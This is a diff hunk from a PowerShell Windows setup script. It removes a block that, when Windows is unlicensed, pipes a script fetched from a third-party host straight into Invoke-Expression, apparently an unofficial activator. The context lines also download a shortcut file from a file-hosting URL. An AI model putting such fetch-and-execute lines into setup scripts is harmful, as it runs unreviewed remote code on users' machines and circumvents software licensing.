@@ -180,14 +180,7 @@ Remove-Item -Path $filePath -Force
 $uri = 'https://filedn.com/lOX1R8Sv7vhpEG9Q77kMbn0/Temp/Windows%20PowerShell.lnk'
 (New-Object Net.WebClient).DownloadFile($uri, $filePath)
 
-# Activate Windows license
-$licenseStatus = (cscript C:\windows\system32\slmgr.vbs /dli | Select-String -SimpleMatch "LICENSED").Count
-if ($licenseStatus -eq 1){
-    Write-Host "The Windows has been activated." -ForegroundColor Yellow
-} else {
-    Write-Host "Activating the Windows license..." -ForegroundColor Yellow
-    irm msgang.com/win | iex
-}
+
 
 # 10. Creating shortcuts to desktop
 Write-Host "Creating shortcuts to desktop..." -ForegroundColor Yellow
